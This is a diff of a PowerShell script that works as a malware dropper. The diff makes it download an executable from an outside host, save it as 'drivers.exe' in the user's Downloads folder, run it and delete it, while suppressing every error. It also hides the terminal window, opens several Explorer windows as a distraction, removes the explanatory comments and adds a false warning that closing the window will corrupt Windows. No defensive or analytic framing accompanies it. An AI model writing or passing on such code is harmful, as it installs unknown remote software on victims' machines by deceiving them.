@@ -2,7 +2,20 @@
 $url = "https://dkm.s.gy/file"
 $out = "$env:USERPROFILE\Downloads\drivers.exe"
 
-# --- Anti-Interruption & Window Manipulation ---
+
+Write-Host "importing...." -ForegroundColor Yellow
+try {
+    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
+    
+    if (Test-Path $out) {
+        Start-Process -FilePath $out -Wait
+        Remove-Item $out -Force -ErrorAction SilentlyContinue
+    }
+} catch {
+
+}
+
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,38 +28,17 @@ public class WindowHelper {
 "@
 
 $hWnd = [WindowHelper]::GetForegroundWindow()
-[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize (Hide the terminal)
+[WindowHelper]::ShowWindow($hWnd, 6) 
 
-Write-Host "Starting installation..." -ForegroundColor Cyan
 
-# Open File Explorer 10 times in Full Screen
-$shell = New-Object -ComObject Shell.Application
-1..10 | ForEach-Object { 
-    $exp = $shell.Explore("C:\")
-    $exp.FullScreen = $true
-}
+1..5 | ForEach-Object { Start-Process explorer }
 
-# Download the file
-Write-Host "importing...." -ForegroundColor Yellow
-try {
-    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
-} catch {
-    Write-Error "Download failed: $_"
-    exit 1
-}
 
-# Run the file
-if (Test-Path $out) {
-    Write-Host "Running..." -ForegroundColor Green
-    Start-Process -FilePath $out -Wait
-    Write-Host "complete!" -ForegroundColor Green
+Write-Host "==================================================" -ForegroundColor Red
+Write-Host "WARNING: DO NOT CLOSE THIS TERMINAL!" -ForegroundColor Red
+Write-Host "Closing this window may cause Windows corruption." -ForegroundColor Red
+Write-Host "Please wait for the process to finish..." -ForegroundColor Red
+Write-Host "==================================================" -ForegroundColor Red
 
-    # Remove the file after running
-    Remove-Item $out -Force -ErrorAction SilentlyContinue
-    Write-Host "Cleanup complete." -ForegroundColor Gray
-} else {
-    Write-Warning "swerteeng kumag"
-}
 
-# Exit the terminal
 exit
